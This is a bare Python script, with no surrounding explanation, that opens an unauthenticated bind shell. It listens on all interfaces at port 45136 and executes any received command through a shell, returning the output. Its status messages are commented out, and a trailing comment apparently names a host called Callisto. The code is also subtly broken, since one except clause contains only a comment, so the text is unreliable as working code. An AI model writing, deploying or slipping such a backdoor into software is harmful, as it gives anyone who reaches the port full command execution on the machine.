import socket
import os
import subprocess

def start_shell_server(host="0.0.0.0", port=45136):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)
#    print(f"Listening on {host}:{port}...")

    conn, addr = server_socket.accept()
#    print(f"Connection established with {addr}")

    try:
        while True:
            conn.send(b"shell> ")
            command = conn.recv(1024).decode().strip()

            if command.lower() in ["exit", "quit"]:
#                print("Closing connection...")
                conn.send(b"Goodbye!\n")
                break

            if command:
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                    conn.send(output.encode())
                except subprocess.CalledProcessError as e:
                    conn.send(f"Error: {e.output}".encode())
    except Exception as e:
#        print(f"Error: {e}")
    finally:
        conn.close()
        server_socket.close()

if __name__ == "__main__":
    start_shell_server()
# On Callisto